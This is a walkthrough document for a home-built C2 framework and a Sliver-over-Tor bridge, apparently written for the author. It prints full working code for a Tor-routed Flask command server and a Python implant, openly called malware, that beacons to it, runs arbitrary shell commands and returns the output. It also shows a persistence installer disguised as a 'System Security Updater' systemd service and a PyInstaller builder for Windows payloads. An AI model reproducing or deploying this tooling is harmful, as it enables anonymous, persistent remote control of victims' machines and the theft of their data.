# COMPLETE PROJECT DOCUMENTATION
## From Original C2 to Sliver Tor Bridge

**This document explains EVERYTHING - line by line, file by file.**

---

# PART 1: THE ORIGINAL PROJECT (anonymous-c2-infrastructure)

This is your FIRST project - a complete C2 (Command and Control) framework built from scratch.

---

## What is a C2 Framework?

A C2 (Command and Control) framework has 3 main parts:

```
┌─────────────────┐         ┌─────────────────┐         ┌─────────────────┐
│    ATTACKER     │────────▶│    C2 SERVER    │◀────────│     VICTIM      │
│                 │         │                 │         │   (Implant)     │
│  Sends commands │         │  Stores/relays  │         │ Executes &      │
│  Views results  │         │  commands       │         │ reports back    │
└─────────────────┘         └─────────────────┘         └─────────────────┘
```

**Your project does exactly this, with Tor for anonymity.**

---

## Project Structure Overview

```
anonymous-c2-infrastructure/
│
├── server/                    # THE C2 SERVER
│   ├── app.py                 # Flask web server - receives beacons
│   ├── models.py              # Database tables - Agent, Command
│   └── database.py            # Database connection setup
│
├── implant/                   # THE MALWARE
│   ├── implant.py             # Runs on victim - beacons, executes
│   └── install.py             # Establishes persistence on Linux
│
├── proxy/                     # OPTIONAL RELAY
│   └── proxy.py               # Proxy node for extra obfuscation
│
├── utils/                     # UTILITIES
│   └── tor_manager.py         # Creates Tor hidden services
│
├── builder.py                 # Builds Windows .exe payloads
├── cli.py                     # Your command interface
├── requirements.txt           # Python dependencies
└── README.md                  # Documentation
```

---

# FILE: server/database.py

**Purpose:** Sets up the database connection. Uses SQLite (file-based database).

**Full Code:**
```python
from sqlalchemy import create_engine
from sqlalchemy.orm import scoped_session, sessionmaker
from sqlalchemy.ext.declarative import declarative_base

import os
engine = create_engine(os.getenv('DATABASE_URL', 'sqlite:///c2.db'))
db_session = scoped_session(sessionmaker(autocommit=False,
                                         autoflush=False,
                                         bind=engine))
Base = declarative_base()
Base.query = db_session.query_property()

def init_db():
    import server.models
    Base.metadata.create_all(bind=engine)
```

### Line-by-Line Explanation:

**Line 1: `from sqlalchemy import create_engine`**
- **SQLAlchemy** = Python library for working with databases
- **create_engine** = Function that creates a connection to a database
- Think of engine as the "database driver"

**Line 2: `from sqlalchemy.orm import scoped_session, sessionmaker`**
- **ORM** = Object-Relational Mapping (write Python, not SQL)
- **sessionmaker** = Creates database sessions (like a conversation with the database)
- **scoped_session** = Makes sessions thread-safe (multiple users can access simultaneously)

**Line 3: `from sqlalchemy.ext.declarative import declarative_base`**
- **declarative_base** = Creates a base class for our database tables
- All our models (Agent, Command) will inherit from this

**Line 6: `engine = create_engine(os.getenv('DATABASE_URL', 'sqlite:///c2.db'))`**
- `os.getenv('DATABASE_URL', 'sqlite:///c2.db')` = Try to get DATABASE_URL from environment, otherwise use SQLite file
- `sqlite:///c2.db` = SQLite database stored in file `c2.db`
- Why? SQLite is simple, no server needed, just a file

**Lines 7-9: `db_session = scoped_session(...)`**
```python
db_session = scoped_session(sessionmaker(autocommit=False,
                                         autoflush=False,
                                         bind=engine))
```
- Creates a session factory bound to our engine
- `autocommit=False` = Don't save automatically, we control when to save
- `autoflush=False` = Don't push changes until we say so
- `bind=engine` = Connect to our database engine

**Line 10: `Base = declarative_base()`**
- Creates the base class for all our database models
- Every table class will inherit from `Base`

**Line 11: `Base.query = db_session.query_property()`**
- Adds a `query` property to Base
- Allows us to do `Agent.query.all()` instead of `db_session.query(Agent).all()`
- Just a convenience feature

**Lines 13-15: `def init_db():`**
```python
def init_db():
    import server.models
    Base.metadata.create_all(bind=engine)
```
- **Function to create all database tables**
- `import server.models` = Loads our model definitions (Agent, Command)
- `Base.metadata.create_all(bind=engine)` = Creates the actual tables in the database

---

# FILE: server/models.py

**Purpose:** Defines the database tables (what data we store).

**Full Code:**
```python
from sqlalchemy import Column, Integer, String, Text, DateTime, ForeignKey
from sqlalchemy.orm import relationship
from server.database import Base
import datetime

class Agent(Base):
    __tablename__ = 'agents'
    id = Column(String(50), primary_key=True)
    hostname = Column(String(100))
    username = Column(String(100))
    last_seen = Column(DateTime, default=datetime.datetime.utcnow)
    
    commands = relationship('Command', backref='agent', lazy=True)

    def __repr__(self):
        return f'<Agent {self.id}>'

class Command(Base):
    __tablename__ = 'commands'
    id = Column(Integer, primary_key=True)
    agent_id = Column(String(50), ForeignKey('agents.id'), nullable=False)
    command = Column(Text, nullable=False)
    output = Column(Text)
    status = Column(String(20), default='pending') 
    created_at = Column(DateTime, default=datetime.datetime.utcnow)
    executed_at = Column(DateTime)

    def __repr__(self):
        return f'<Command {self.id} for {self.agent_id}>'
```

### Line-by-Line Explanation:

**Line 1: Imports from SQLAlchemy**
```python
from sqlalchemy import Column, Integer, String, Text, DateTime, ForeignKey
```
- `Column` = Defines a column in a table
- `Integer` = Number type
- `String(50)` = Text with max length
- `Text` = Long text (no limit)
- `DateTime` = Date and time
- `ForeignKey` = Link to another table

**Line 6-16: The Agent Class**
```python
class Agent(Base):
    __tablename__ = 'agents'
```
- `class Agent(Base)` = Agent inherits from Base (it's a database table)
- `__tablename__ = 'agents'` = The actual table name in SQLite

**Line 8: `id = Column(String(50), primary_key=True)`**
- The agent's unique identifier
- `primary_key=True` = This is the main identifier (unique, can't be null)
- It's a string because we use the machine's MAC address (like `281474976710655`)

**Line 9-11: More columns**
```python
hostname = Column(String(100))
username = Column(String(100))
last_seen = Column(DateTime, default=datetime.datetime.utcnow)
```
- `hostname` = Computer name (e.g., "DESKTOP-ABC123")
- `username` = User running the implant (e.g., "john")
- `last_seen` = When did this agent last check in?
- `default=datetime.datetime.utcnow` = Automatically set to current time

**Line 13: `commands = relationship('Command', backref='agent', lazy=True)`**
- **Relationship** = Links Agent to Commands
- `backref='agent'` = From a Command, you can access `command.agent`
- `lazy=True` = Don't load commands until we ask for them

**Lines 18-29: The Command Class**
```python
class Command(Base):
    __tablename__ = 'commands'
    id = Column(Integer, primary_key=True)
    agent_id = Column(String(50), ForeignKey('agents.id'), nullable=False)
    command = Column(Text, nullable=False)
    output = Column(Text)
    status = Column(String(20), default='pending')
```
- `id` = Auto-incrementing number (1, 2, 3...)
- `agent_id` = Which agent this command is for
- `ForeignKey('agents.id')` = Must match an existing agent
- `command` = The actual command (e.g., "whoami")
- `output` = What the command returned
- `status` = 'pending' or 'executed'

---

# FILE: server/app.py

**Purpose:** The Flask web server that receives beacons from implants and stores commands.

**Full Code:**
```python
from flask import Flask, request, jsonify, abort
from server.database import db_session, init_db
from server.models import Agent, Command
import datetime
import os

app = Flask(__name__)

@app.teardown_appcontext
def shutdown_session(exception=None):
    db_session.remove()

@app.route('/')
def index():
    return "C2 Server Online", 200

@app.route('/api/beacon', methods=['POST'])
def beacon():
    data = request.json
    if not data or 'id' not in data:
        abort(400)
    
    agent_id = data['id']
    hostname = data.get('hostname', 'unknown')
    username = data.get('username', 'unknown')
    
    agent = Agent.query.filter_by(id=agent_id).first()
    if not agent:
        agent = Agent(id=agent_id, hostname=hostname, username=username)
        db_session.add(agent)
    else:
        agent.last_seen = datetime.datetime.utcnow()
        agent.hostname = hostname
        agent.username = username
    
    db_session.commit()
    
    commands = Command.query.filter_by(agent_id=agent_id, status='pending').all()
    cmd_list = []
    for cmd in commands:
        cmd_list.append({'id': cmd.id, 'command': cmd.command})
        
    return jsonify({'commands': cmd_list})

@app.route('/api/result', methods=['POST'])
def result():
    data = request.json
    if not data or 'id' not in data or 'cmd_id' not in data:
        abort(400)
        
    cmd_id = data['cmd_id']
    output = data.get('output', '')
    
    command = Command.query.filter_by(id=cmd_id).first()
    if command:
        command.output = output
        command.status = 'executed'
        command.executed_at = datetime.datetime.utcnow()
        db_session.commit()
        return jsonify({'status': 'success'})
    
    return jsonify({'status': 'error', 'message': 'Command not found'}), 404

def run_server(port=5000):
    init_db()
    app.run(host='127.0.0.1', port=port)

if __name__ == '__main__':
    run_server()
```

### Line-by-Line Explanation:

**Lines 1-5: Imports**
```python
from flask import Flask, request, jsonify, abort
```
- `Flask` = The web framework
- `request` = Access incoming request data
- `jsonify` = Convert Python dict to JSON response
- `abort` = Return an error (400, 404, etc.)

**Line 7: `app = Flask(__name__)`**
- Creates the Flask application
- `__name__` = Current module name (helps Flask find files)

**Lines 9-11: Cleanup**
```python
@app.teardown_appcontext
def shutdown_session(exception=None):
    db_session.remove()
```
- When a request ends, remove the database session
- Prevents memory leaks

**Lines 13-15: Root endpoint**
```python
@app.route('/')
def index():
    return "C2 Server Online", 200
```
- If someone visits `/`, show "C2 Server Online"
- Status code 200 = OK

**Lines 17-44: THE BEACON ENDPOINT (MOST IMPORTANT!)**

This is where infected machines "phone home":

```python
@app.route('/api/beacon', methods=['POST'])
def beacon():
    data = request.json
```
- `@app.route('/api/beacon', methods=['POST'])` = Handle POST requests to /api/beacon
- `data = request.json` = Get the JSON body the implant sent

```python
    if not data or 'id' not in data:
        abort(400)
```
- If no data or no ID, return 400 (Bad Request)

```python
    agent_id = data['id']
    hostname = data.get('hostname', 'unknown')
    username = data.get('username', 'unknown')
```
- Extract the info the implant sent
- `.get('key', 'default')` = Get value or use default

```python
    agent = Agent.query.filter_by(id=agent_id).first()
    if not agent:
        agent = Agent(id=agent_id, hostname=hostname, username=username)
        db_session.add(agent)
    else:
        agent.last_seen = datetime.datetime.utcnow()
```
- Look for this agent in database
- If new: create it
- If exists: update last_seen time

```python
    commands = Command.query.filter_by(agent_id=agent_id, status='pending').all()
    cmd_list = []
    for cmd in commands:
        cmd_list.append({'id': cmd.id, 'command': cmd.command})
    return jsonify({'commands': cmd_list})
```
- Get all pending commands for this agent
- Return them as JSON
- The implant will execute these!

**Lines 46-64: THE RESULT ENDPOINT**

Where implants send back command output:

```python
@app.route('/api/result', methods=['POST'])
def result():
    data = request.json
    cmd_id = data['cmd_id']
    output = data.get('output', '')
    
    command = Command.query.filter_by(id=cmd_id).first()
    if command:
        command.output = output
        command.status = 'executed'
        command.executed_at = datetime.datetime.utcnow()
        db_session.commit()
```
- Find the command by ID
- Save the output
- Mark as executed
- Save to database

---

# FILE: implant/implant.py

**Purpose:** THE MALWARE. Runs on the victim machine, phones home, executes commands.

**Full Code:**
```python
import requests
import time
import subprocess
import platform
import uuid
import socket
import os

C2_URL = "http://localhost:5000"
PROXY_HOST = "127.0.0.1"
PROXY_PORT = 9050

def get_system_info():
    return {
        'id': str(uuid.getnode()),
        'hostname': socket.gethostname(),
        'username': os.getlogin() if hasattr(os, 'getlogin') else 'unknown',
        'os': platform.system(),
        'release': platform.release()
    }

def execute_command(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        return output.decode('utf-8')
    except subprocess.CalledProcessError as e:
        return str(e.output)
    except Exception as e:
        return str(e)

def beacon(url, proxies):
    info = get_system_info()
    try:
        response = requests.post(f"{url}/api/beacon", json=info, proxies=proxies)
        if response.status_code == 200:
            data = response.json()
            commands = data.get('commands', [])
            for cmd in commands:
                output = execute_command(cmd['command'])
                send_result(url, cmd['id'], output, proxies)
    except Exception as e:
        print(f"[!] Beacon error: {e}")

def send_result(url, cmd_id, output, proxies):
    data = {
        'id': str(uuid.getnode()),
        'cmd_id': cmd_id,
        'output': output
    }
    requests.post(f"{url}/api/result", json=data, proxies=proxies)

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('--url', help='C2 URL', required=True)
    parser.add_argument('--tor-port', default=9050, type=int)
    args = parser.parse_args()
    
    proxies = {
        'http': f'socks5h://127.0.0.1:{args.tor_port}',
        'https': f'socks5h://127.0.0.1:{args.tor_port}'
    }
    
    while True:
        beacon(args.url, proxies)
        time.sleep(10)
```

### Line-by-Line Explanation:

**Line 15: `'id': str(uuid.getnode())`**
- `uuid.getnode()` = Gets the machine's MAC address as a number
- Why? It's unique to each computer
- Example: `281474976710655`

**Line 16: `socket.gethostname()`**
- Gets the computer's network name
- Example: `DESKTOP-ABC123`

**Lines 22-29: execute_command**
```python
def execute_command(cmd):
    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
    return output.decode('utf-8')
```
- `subprocess.check_output()` = Run a command and capture output
- `shell=True` = Use the system shell (allows pipes, etc.)
- `stderr=subprocess.STDOUT` = Capture errors too
- `.decode('utf-8')` = Convert bytes to string

**Lines 31-41: beacon (THE MAIN LOOP)**
```python
def beacon(url, proxies):
    info = get_system_info()
    response = requests.post(f"{url}/api/beacon", json=info, proxies=proxies)
```
- Collects system info
- Sends POST to C2 server
- `proxies=proxies` = Route through Tor!

```python
    for cmd in commands:
        output = execute_command(cmd['command'])
        send_result(url, cmd['id'], output, proxies)
```
- For each pending command
- Execute it
- Send the result back

**Lines 56-58: SOCKS5 Proxy for Tor**
```python
proxies = {
    'http': f'socks5h://127.0.0.1:{args.tor_port}',
    'https': f'socks5h://127.0.0.1:{args.tor_port}'
}
```
- `socks5h://` = SOCKS5 with DNS resolution through the proxy
- This routes ALL traffic through Tor
- Without the `h`, DNS would leak!

**Lines 60-62: The Loop**
```python
while True:
    beacon(args.url, proxies)
    time.sleep(10)
```
- Infinite loop
- Beacon every 10 seconds
- This is the "heartbeat"

---

# FILE: implant/install.py

**Purpose:** Establishes persistence on Linux. Makes the implant run on boot.

```python
def install_implant(url, tor_port):
    home_dir = os.path.expanduser("~")
    install_dir = os.path.join(home_dir, ".local", "share", "system-updater")
```
- `~/.local/share/system-updater/` = Hidden in user's home directory
- Looks like a system utility to avoid suspicion

```python
    service_content = f"""[Unit]
Description=System Security Updater
After=network.target

[Service]
ExecStart=/usr/bin/python3 {implant_dest} --url {url} --tor-port {tor_port}
Restart=always
RestartSec=60

[Install]
WantedBy=default.target
"""
```
- **systemd service file** = Linux's service manager
- `After=network.target` = Start after network is up
- `Restart=always` = If it crashes, restart it
- `RestartSec=60` = Wait 60 seconds before restart

```python
    subprocess.run(["systemctl", "--user", "enable", "system-updater"], check=True)
    subprocess.run(["systemctl", "--user", "start", "system-updater"], check=True)
```
- `--user` = User-level service (no root needed!)
- `enable` = Start on boot
- `start` = Start now

---

# FILE: utils/tor_manager.py

**Purpose:** Creates Tor hidden services programmatically.

```python
class TorManager:
    def __init__(self, hidden_service_dir='hidden_service', tor_port=9050, 
                 ctrl_port=9051, service_port=80, target_port=5000):
```
- `target_port=5000` = In the OLD version, points to YOUR Flask server

```python
    tor_config = {
        'SocksPort': str(self.tor_port),
        'ControlPort': str(self.ctrl_port),
        'HiddenServiceDir': self.hidden_service_dir,
        'HiddenServicePort': f'{self.service_port} 127.0.0.1:{self.target_port}',
    }
```
- `HiddenServicePort': '80 127.0.0.1:5000'` = "When someone connects to xyz.onion:80, forward to localhost:5000"

---

# FILE: builder.py

**Purpose:** Creates standalone Windows executables from the implant.

```python
wrapper_content = f"""
import implant
C2_URL = "{url}"
TOR_PORT = {tor_port}

proxies = {{
    'http': f'socks5h://127.0.0.1:{{TOR_PORT}}',
    'https': f'socks5h://127.0.0.1:{{TOR_PORT}}'
}}

while True:
    implant.beacon(C2_URL, proxies)
    time.sleep(10)
"""
```
- Creates a wrapper that hardcodes the C2 URL
- No command-line arguments needed in the final executable

```python
cmd = [
    sys.executable, "-m", "PyInstaller",
    "--onefile",
    "--name", output_name,
    wrapper_path
]
subprocess.run(cmd, check=True)
```
- **PyInstaller** = Bundles Python + script into single .exe
- `--onefile` = Everything in one file
- `--name` = Output filename

---

# FILE: cli.py

**Purpose:** Your command interface for controlling everything.

```python
@cli.command()
def start_c2(port, tor_port, ctrl_port):
    tm = TorManager(hidden_service_dir='c2_hidden_service', ...)
    tm.start_tor()
    onion = tm.get_onion_address()
    print(f"[+] C2 Hidden Service Available at: http://{onion}")
    run_server(port=port)
```
- Starts Tor hidden service
- Starts Flask server
- You now have an anonymous C2!

```python
@cli.command()
def shell():
    """Interactive C2 Shell"""
    while True:
        cmd_input = input(prompt).strip()
        if cmd == 'exec':
            command_str = " ".join(parts[1:])
            c = Command(agent_id=current_agent, command=command_str)
            db_session.add(c)
            db_session.commit()
```
- Interactive shell for managing agents
- `list` = List all agents
- `use <id>` = Select an agent
- `exec <cmd>` = Queue a command
- `check` = See results

---

# PART 2: THE NEW PROJECT (sliver-tor-bridge)

## Why Create This?

Your old project was a **complete C2 from scratch**. Great for learning!

But **Sliver** is:
- Used by real red teams
- Has 100x more features
- Actively maintained
- Trusted by professionals

**The Bridge** takes your Tor knowledge and applies it to Sliver.

---

## What Changed?

| Old Project | New Bridge |
|-------------|------------|
| Your Flask server | Sliver does this |
| Your implant | Sliver does this |
| Your database | Sliver does this |
| Your builder | Sliver does this |
| **Your Tor Manager** | **WE KEPT THIS** |
| Nothing | **NEW: HTTP Proxy** |

---

## The Key Files in New Project

### sliver_tor_bridge/tor_manager.py

**Differences from original:**

```python
# OLD:
target_port=5000  # Your Flask server

# NEW:
target_port=8443  # Our proxy (which forwards to Sliver)
```

```python
# OLD:
self.tor_process = launch_tor_with_config(
    config=tor_config,
    take_ownership=True,
    completion_percent=100
)

# NEW:
self.tor_process = launch_tor_with_config(
    config=tor_config,
    take_ownership=True,
    completion_percent=100,
    timeout=300,  # Longer timeout
    init_msg_handler=lambda line: print(f"    {line}") if 'Bootstrapped' in line else None
)
```
- Added `timeout=300` (5 minutes instead of 90 seconds)
- Added progress indicator (shows Bootstrapped %)

---

### sliver_tor_bridge/proxy.py

**Entirely NEW - didn't exist before!**

This is the key innovation:

```python
class SliverProxy:
    def __init__(self, sliver_host='127.0.0.1', sliver_port=8443, listen_port=8080):
        self.sliver_url = f'https://{sliver_host}:{sliver_port}'
```
- Listens on port 8080
- Forwards to Sliver on 8443

```python
def _relay_request(self, path):
    response = requests.request(
        method=request.method,
        url=f'{self.sliver_url}/{path}',
        headers=headers,
        data=request.get_data(),
        verify=False  # Sliver uses self-signed certs
    )
```
- Takes EVERYTHING from incoming request
- Sends to Sliver
- Returns Sliver's response

**Why is this needed?**
```
WITHOUT PROXY:
Tor Hidden Service → ??? → Sliver
(Sliver can't directly accept hidden service connections)

WITH PROXY:
Tor Hidden Service → Proxy → Sliver
(Proxy translates HTTP to HTTPS and handles Sliver's self-signed certs)
```

---

## The Complete Flow

```
1. Start Sliver server (port 8443)
2. Start sliver-tor-bridge
   └── Tor Manager creates .onion address
   └── Proxy listens on port 8080
   └── Hidden service points to port 8080
3. Generate Sliver implant with .onion URL
4. Victim runs implant
   └── Implant connects to Tor
   └── Tor routes to your hidden service
   └── Hidden service → Proxy → Sliver
5. You control victim through Sliver!
```

---

# TALKING POINTS FOR EXPERTS

## The Evolution:

> "I started by building a complete C2 framework from scratch - implant, server, persistence, payload builder, and Tor integration. This taught me the fundamentals of C2 architecture.
>
> Then I realized I could apply my Tor expertise to Sliver, the industry-standard C2. Instead of reinventing the wheel, I created a bridge that adds anonymous Tor transport to Sliver without modifying its code.
>
> The key insight was using an HTTP-to-HTTPS proxy layer that translates hidden service connections to Sliver's HTTPS listener."

## Technical Depth:

**Why a proxy instead of direct integration?**
> "Sliver uses self-signed TLS certificates and expects HTTPS. Tor hidden services work with raw TCP. The proxy handles the TLS negotiation and certificate verification bypass locally, making the integration seamless."

**Why not modify Sliver's source?**
> "Sliver is written in Go and has a complex build system. Modifying it would require maintaining a fork against upstream changes. The proxy approach is maintainable, version-agnostic, and portable."

**How do you handle Tor latency?**
> "C2 beacons are typically 10-60 second intervals. Tor adds 1-3 seconds of latency per request. This is negligible for most C2 operations and acceptable for the anonymity gained."

---

# SUMMARY

## Old Project (anonymous-c2-infrastructure):
- Complete C2 from scratch
- Flask server, Python implant, SQLite database
- Tor integration via tor_manager.py
- ~500 lines of code

## New Project (sliver-tor-bridge):
- Bridge layer only
- Reuses tor_manager.py
- NEW proxy.py for Sliver integration
- ~200 lines of core code (focused)

## What You Learned:
1. How C2 systems work (beaconing, command queuing)
2. Database design for C2 (agents, commands)
3. Tor hidden services programmatically
4. HTTP proxying
5. Integrating with professional tools

**You can now explain both projects to any expert!** 🎯
